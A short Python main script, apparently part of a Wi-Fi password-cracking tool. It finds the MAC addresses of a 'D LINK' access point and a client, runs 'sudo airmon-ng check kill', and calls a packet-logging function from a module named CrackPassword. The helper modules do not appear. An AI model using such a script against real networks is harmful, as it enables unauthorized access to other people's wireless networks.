from listInterfaces import listInterfaces
from CheckMonitorMode import checkMonitor
from CheckPacketInjection import checkPacketInjection
from DeactivateMonitorMode import deactivateMonitorModeMain
from CrackPassword import logPackets
from GetMACAddresses import getMACAddresses
import os
mainInterface = "wlx1cbfce0d6a5b"


MACs = getMACAddresses("D LINK")
os.system("sudo airmon-ng check kill")
logPackets(MACs['AP Channel'],MACs['AP MAC'],MACs['Client MAC'])
